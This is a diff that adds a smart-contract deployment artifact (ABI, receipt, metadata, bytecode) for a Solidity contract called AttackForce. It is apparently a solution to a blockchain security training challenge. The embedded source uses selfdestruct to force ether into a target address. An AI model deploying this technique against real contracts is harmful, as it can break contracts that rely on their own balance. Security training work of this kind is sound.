@@ -1,0 +1,102 @@
+{
+  "address": "0x69091881c5C0563a406459F36b674b344c70f37B",
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address payable",
+          "name": "_target",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "target",
+      "outputs": [
+        {
+          "internalType": "address payable",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "stateMutability": "payable",
+      "type": "receive"
+    }
+  ],
+  "transactionHash": "0x86a3f2129ecb423e2d99df43761ca3f93e80e1c482496c186a7a0a87ba7fb287",
+  "receipt": {
+    "to": null,
+    "from": "0x482577148a64CF20f4a62F14A2455dC0A79478c7",
+    "contractAddress": "0x69091881c5C0563a406459F36b674b344c70f37B",
+    "transactionIndex": 0,
+    "gasUsed": "113948",
+    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000080000000000000000000000000000000000000000000000000800000000000000000000100000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000400000000000000000000001000200000000000000000000000000000000000000000000000000000000100004000000000000000000001000000000000000000000000000000100000000000000008000000000000000000000000000000000000002000000000000000100000",
+    "blockHash": "0xca6f75f8cf9ce4a8b8d7d026565c4a593faedcfa4c12b480a898678ba1abd481",
+    "transactionHash": "0x86a3f2129ecb423e2d99df43761ca3f93e80e1c482496c186a7a0a87ba7fb287",
+    "logs": [
+      {
+        "transactionIndex": 0,
+        "blockNumber": 40932979,
+        "transactionHash": "0x86a3f2129ecb423e2d99df43761ca3f93e80e1c482496c186a7a0a87ba7fb287",
+        "address": "0x0000000000000000000000000000000000001010",
+        "topics": [
+          "0x4dfe1bbbcf077ddc3e01291eea2d5c70c2b422b415d95645b9adcfd678cb1d63",
+          "0x0000000000000000000000000000000000000000000000000000000000001010",
+          "0x000000000000000000000000482577148a64cf20f4a62f14a2455dc0a79478c7",
+          "0x000000000000000000000000e7f13f6bc1e7f5ca4a6c9a255124ce22c46f8ef0"
+        ],
+        "data": "0x000000000000000000000000000000000000000000000000000131b93a93a8400000000000000000000000000000000000000000000000000edcbe120d6b713000000000000000000000000000000000000000000000008a1f609512d6b276d30000000000000000000000000000000000000000000000000edb8c58d2d7c8f000000000000000000000000000000000000000000000008a1f61c6cc11461f13",
+        "logIndex": 0,
+        "blockHash": "0xca6f75f8cf9ce4a8b8d7d026565c4a593faedcfa4c12b480a898678ba1abd481"
+      }
+    ],
+    "blockNumber": 40932979,
+    "cumulativeGasUsed": "113948",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [
+    "0xDcBB276857C3fBF64b7A26179dA02B34133d5203"
+  ],
+  "numDeployments": 1,
+  "solcInputHash": "8bdb827a1ef593fa37828a0599942794",
+  "metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_target\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"target\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Force/AttackForce.sol\":\"AttackForce\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Force/AttackForce.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract AttackForce {\\n\\n    address payable public target;\\n    constructor(address payable _target) {\\n        target = _target;\\n    }\\n\\n    receive() external payable {\\n        selfdestruct(target);\\n    }\\n}\",\"keccak256\":\"0x0151e165aa1f8d91c27fbd5b4b430f3d0c5c38442fdbfe8050ee342b1dc9a02d\",\"license\":\"MIT\"}},\"version\":1}",
+  "bytecode": "0x608060405234801561001057600080fd5b5060405161013938038061013983398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b60a7806100926000396000f3fe60806040526004361060205760003560e01c8063d4b8399214603757600080fd5b366032576000546001600160a01b0316ff5b600080fd5b348015604257600080fd5b506000546055906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f3fea264697066735822122040762adceb6d4769ad5d640998c2420ecadbf79dab2dc1f9a9da75349f274f1064736f6c63430008110033",
+  "deployedBytecode": "0x60806040526004361060205760003560e01c8063d4b8399214603757600080fd5b366032576000546001600160a01b0316ff5b600080fd5b348015604257600080fd5b506000546055906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f3fea264697066735822122040762adceb6d4769ad5d640998c2420ecadbf79dab2dc1f9a9da75349f274f1064736f6c63430008110033",
+  "devdoc": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {},
+    "version": 1
+  },
+  "storageLayout": {
+    "storage": [
+      {
+        "astId": 3,
+        "contract": "contracts/Force/AttackForce.sol:AttackForce",
+        "label": "target",
+        "offset": 0,
+        "slot": "0",
+        "type": "t_address_payable"
+      }
+    ],
+    "types": {
+      "t_address_payable": {
+        "encoding": "inplace",
+        "label": "address payable",
+        "numberOfBytes": "20"
+      }
+    }
+  }
+}
